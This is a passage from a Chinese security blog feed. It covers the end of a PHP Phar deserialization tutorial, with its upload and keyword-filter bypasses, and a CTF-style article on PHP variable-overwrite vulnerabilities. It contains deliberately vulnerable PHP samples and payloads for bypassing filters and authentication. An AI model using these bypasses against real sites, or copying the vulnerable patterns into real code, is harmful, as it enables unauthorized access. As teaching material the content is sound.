class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.jpg&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?r=zip:/</span><span class="hljs-regexp">/pic/</span>test4.jpg%<span class="hljs-number">23</span>test<br><br>pic是图片保存目录<br></code></pre></td></tr></table></figure><p>这个例子只是利用了phar伪协议解析文件，并没有利用反序列化</p><h1 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h1><h2 id="4-1-更改文件格式"><a href="#4-1-更改文件格式" class="headerlink" title="4.1 更改文件格式"></a>4.1 更改文件格式</h2><p>我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/gif&quot;</span><br></code></pre></td></tr></table></figure><p>要求文件格式只能为<code>gif</code>，这个时候我们该怎么办呢？<br>这个时候我们需要朝花夕拾，重提一下PHP识别Phar文件的方式。PHP通过<code>Stub</code>里的<code>__HALT_COMPILER();</code>来识别这个文件是Phar文件，对于其他是无限制的，这个时候也就意味着我们即使对文件后缀和文件名进行更改，其实质仍然是Phar文件。</p><p>所以我们只要在前面加上gif89a从而可以绕过</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;.&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-variable">$obj</span> -&gt; name = <span class="hljs-string">&quot;quan9i&quot;</span>;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">startBuffering</span>(); <span class="hljs-comment">//开始缓冲 Phar 写操作</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub，添加gif文件头</span><br>    <span class="hljs-variable">$phar</span> -&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//要压缩的文件</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$obj</span>);  <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在浏览器上访问此文件生成test.phar文件，用010editor查看<br><a href="https://img-blog.csdnimg.cn/21b23d09b7ad4d0cb95087e6351e3ac1.png"><img src="D:/mdimage/21b23d09b7ad4d0cb95087e6351e3ac1.png" alt="在这里插入图片描述"></a> </p><h2 id="4-2-绕过phar关键字检测"><a href="#4-2-绕过phar关键字检测" class="headerlink" title="4.2 绕过phar关键字检测"></a>4.2 绕过phar关键字检测</h2><p>Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为<code>Phar://xxx</code>来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">if (preg_match(&quot;/</span><span class="hljs-keyword">^php</span><span class="language-xml">|</span><span class="hljs-keyword">^file</span><span class="language-xml">|</span><span class="hljs-keyword">^phar</span><span class="language-xml">|</span><span class="hljs-keyword">^dict</span><span class="language-xml">|</span><span class="hljs-keyword">^zip</span><span class="language-xml">/i&quot;,</span><span class="hljs-variable">$filename</span><span class="language-xml">)&#123;</span><br><span class="language-xml">    die();</span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p>绕过的话，我们的办法是使用各种协议来进行绕过，具体如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phar:<span class="hljs-regexp">//</span>test.phar<br><span class="hljs-regexp">//</span>即使用filter伪协议来进行绕过<br><span class="hljs-number">2</span>、compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用bzip2协议来进行绕过<br><span class="hljs-number">3</span>、compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用zlib协议进行绕过<br></code></pre></td></tr></table></figure><h2 id="4-3-绕过-HALT-COMPILER检测"><a href="#4-3-绕过-HALT-COMPILER检测" class="headerlink" title="4.3 绕过__HALT_COMPILER检测"></a>4.3 绕过__HALT_COMPILER检测</h2><p>我们在前文初识Phar时就提到过，PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么出于安全考虑，即为了防止Phar反序列化的出现，可能就会对这个进行过滤，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,<span class="hljs-variable">$Phar</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的话绕过思路有两个<br>1、将Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//接着，代码使用 setArchiveComment() 方法将序列化后的 $a 变量作为压缩包的注释，也就是将序列化的数据作为整个压缩包的一个元数据。</span><br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/decemberus.com/2021/11/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/decemberus.com/2021/11/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP变量覆盖漏洞"><a href="#PHP变量覆盖漏洞" class="headerlink" title="PHP变量覆盖漏洞"></a>PHP变量覆盖漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>自定义的参数值替换原有变量值的情况称为变量覆盖漏洞</strong></p><p>经常导致变量覆盖漏洞场景有：<code>$$</code>使用不当，<code>extract()</code>函数使用不当，<code>parse_str()</code>函数使用不当，<code>import_request_variables()</code>使用不当，开启了全局变量注册等</p><h2 id="导致的变量覆盖问题"><a href="#导致的变量覆盖问题" class="headerlink" title="$$导致的变量覆盖问题"></a>$$导致的变量覆盖问题</h2><p>在php中，$$这种写法被称为可变变量。可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">举个例子<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$x</span> = <span class="hljs-string">&quot;helenchan&quot;</span>;<br><span class="hljs-variable">$$x</span> = <span class="hljs-number">666</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$x</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$helenchan</span>;<br><span class="hljs-meta">?&gt;</span><br>其实就是$(<span class="hljs-variable">$x</span>),变量x的值是可变变量的变量名的意思<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\1-16650609034581.png" alt="img"></p><p>比如再看下面这个例子</p><p><code>$$</code>导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;_COOKIE&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_GET&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)  <br>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span>=&gt;<span class="hljs-variable">$_value</span>)  <br>    &#123;<br>        <span class="hljs-variable">$$_key</span>=  <span class="hljs-variable">$_value</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>) ? <span class="hljs-variable">$id</span> : <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span> === <span class="hljs-string">&quot;helenchan&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NO flag.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>在这个php代码里，GET、POST或COOKIE都能触发变量覆盖漏洞，传入id=helenchan后，在<span class="hljs-keyword">foreach</span>语句中，<span class="hljs-variable">$_key</span>为id，<span class="hljs-variable">$_value</span>为helenchan，进而<span class="hljs-variable">$$_key</span>为<span class="hljs-variable">$id</span>，从而实现了变量覆盖<br></code></pre></td></tr></table></figure><h2 id="extract-函数使用不当"><a href="#extract-函数使用不当" class="headerlink" title="extract()函数使用不当"></a>extract()函数使用不当</h2><p>1.extract()函数<br>extract() 函数从数组中将<strong>变量导入到当前的符号表</strong>。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。</p><p>2.语法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">(array,extract_rules,prefix)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定要使用的数组。</td></tr><tr><td align="left"><em>extract_rules</em></td><td align="left">可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP - 如果有冲突，不覆盖已有的变量。EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td align="left"><em>prefix</em></td><td align="left">可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p>注意，flags参数默认为<code>EXTR_OVERWRITE</code>，如果有冲突，覆盖原来的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$auth</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$auth</span> == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;private&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;public&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞<br>在这个例子里，extract()从$_GET中导出变量，从而可以导致任意变量被覆盖。<br>我们只要输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">auth</span>=3<br></code></pre></td></tr></table></figure><p>就可以实现目的</p><p>再来看一个小题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$mypwd</span>))<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mypwd</span>==<span class="hljs-variable">$pwd</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">pwd</span>=1&amp;mypwd=1<br></code></pre></td></tr></table></figure><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p><code>parse_str()</code> 函数把字符串解析成多个变量。其作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量<br>注意：当 <code>magic_quotes_gpc = On</code>，那么在 <code>parse_str()</code> 解析之前，变量会被 <code>addslashes()</code> 转换(也就是会被转义，加反斜线)。</p><p><code>parse_str(string[,array])</code>，两个参数分别为：</p><ul><li>string<br>输入的字符串。如果 <code>str</code> 是 <code>URL</code> 传递入的查询字符串(<code>query string</code>)，则将它解析为变量并设置到当前作用域(如果提供了 <code>array</code> 则会设置到该数组里)<br>注意，<code>php &gt;= 7.2</code>，如果不设置该参数，该函数将失效</li><li>array<br>一个数组，如果设置该参数， 变量将会以数组元素的形式存入到这个数组，作为替代</li></ul><p>下面看一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#phpinfo();</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">2</span>;<br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&#x27;a=1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=xiaoming&amp;age=22&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1xiaoming<br>22<br></code></pre></td></tr></table></figure><p>所以需要降低版本来测试，但是ctf里本来就是大概在4.0-5.0的版本的php，很少有超过7.0版本的题目。</p><p>按正常情况，变量a应该会被重新赋值为1，实现变量覆盖,造成漏洞泄露</p><p>再来看一个题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<br><span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;                    <br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);           <br><span class="hljs-keyword">die</span>();                                       <br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">include</span> (‘./flag.php’);<br><span class="hljs-variable">$a</span> = “https:<span class="hljs-comment">//www.cnblogs.com/wjrblogs/”;</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != ‘QNKCDZO’ &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(‘QNKCDZO’)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(‘其实很简单其实并不难！’);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用 <code>php</code> 的 <code>hash</code> 比较缺陷(<code>PHP</code> 在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0E</code>开头的哈希值都解释为 <code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0E</code>开头的，那么PHP将会认为他们相同，都是 <code>0</code>)，所以，只需要找一个字符串哈希后以 <code>OE</code> 开头即可。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a<br></code></pre></td></tr></table></figure><h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><p><code>import_request_variables()</code>函数将 <code>GET/POST/Cookie</code> 变量导入到全局作用域中，当禁止了 <code>register_globals</code>，但又想用到一些全局变量，那么此函数就很有用</p><p><code>import_request_variables(string[,prefix])</code>，两个参数分别为：</p><ul><li>string<br>指定导入哪些变量为全局变量，可以用字母 <code>G</code>、<code>P</code> 和 <code>C</code> 分别表示导入 <code>GET</code>、<code>POST</code> 和 <code>Cookie</code> 中的变量。这些字母不区分大小写，所以你可以使用 <code>g</code>、<code>p</code> 和 <code>c</code> 的任何组合。<code>POST</code> 包含了通过 <code>POST</code> 方法上传的文件信息。注意这些字母的顺序，当使用 <code>gp</code> 时，<code>POST</code> 变量将使用相同的名字覆盖 <code>GET</code> 变量。任何 <code>GPC</code> 以外的字母都将被忽略</li><li>prefix<br><code>prefix</code> 参数作为变量名的前缀，置于所有被导入到全局作用域的变量之前</li></ul><p>小例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-title function_ invoke__">import_request_variables</span>(<span class="hljs-string">&#x27;G&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$auth</span>== <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;登陆成功&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;登陆失败&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">auth</span>=1<br></code></pre></td></tr></table></figure><h2 id="全局变量覆盖（register-globals）"><a href="#全局变量覆盖（register-globals）" class="headerlink" title="全局变量覆盖（register_globals）"></a>全局变量覆盖（register_globals）</h2><p>在 PHP5.3 之前，默认开启；PHP5.3 默认关闭，PHP5.6 及 5.7 已经被移除</p><p>当 <code>register_globals</code> 全局变量设置开启时，传递过来的值(<code>POST/GET/Cookie</code>)会被直接注册为全局变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;1ndex&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>] == <span class="hljs-string">&quot;1ndex&quot;</span>)&#123;<br><span class="hljs-variable">$authorized</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$authorized</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Success&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>register_globals=Off</code>时，只能通过提交正确的账号密码才可成功登陆，也就是<code>http://127.0.0.1/blfg.php?username=1ndex&amp;password=1ndex</code></p><p>当<code>register_globals=On</code>时，可以无需账号密码通过验证，只需要将变量<code>authorized</code>设置为<code>真</code>即可，可为<code>http://127.0.0.1/blfg.php?authorized=1</code>或者<code>http://127.0.0.1/blfg.php?GLOBALS[authorized]=1</code><br>当<code>register_globals=Off</code>时，该方法无效</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/decemberus.com/2021/11/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/decemberus.com/2021/11/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
